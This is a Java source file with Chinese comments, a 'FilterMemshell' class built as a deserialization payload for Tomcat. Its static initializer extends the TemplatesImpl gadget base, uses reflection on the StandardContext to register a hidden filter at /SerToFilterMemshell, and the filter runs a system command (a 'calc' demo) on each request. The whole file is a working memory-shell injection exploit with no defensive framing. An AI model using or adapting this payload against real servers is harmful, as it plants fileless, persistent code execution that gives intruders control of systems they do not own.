import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

public class FilterMemshell extends AbstractTranslet implements Filter {
    static {
        WebappClassLoaderBase webappClassLoaderBase =
                (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        // 创建filterDefs
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(new FilterMemshell());
        filterDef.setFilterName("SerToFilter");
        filterDef.setFilterClass(FilterMemshell.class.getName());
        // 创建filterMap
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("SerToFilter");
        filterMap.addURLPattern("/SerToFilterMemshell");
        // StandardContext中添加filterDef和filterMap
        standardContext.addFilterDef(filterDef);
        standardContext.addFilterMap(filterMap);
        try {
            // 反射获取filterConfig，并放入filterDef和filterMap
            Constructor applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            applicationFilterConfigConstructor.setAccessible(true);
            ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) applicationFilterConfigConstructor.newInstance(standardContext, filterDef);
            // 获取到StandardContext的filterConfigs
            Field filterConfigsFeild = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsFeild.setAccessible(true);
            Map filterConfigs = (Map) filterConfigsFeild.get(standardContext);
            // 添加filterConfig和filterDef
            filterConfigs.put(filterDef.getFilterName(),applicationFilterConfig);
        } catch (NoSuchFieldException | InvocationTargetException | NoSuchMethodException | InstantiationException |
                 IllegalAccessException e) {
            throw new RuntimeException(e);
        }

    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void destroy() {
        Filter.super.destroy();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}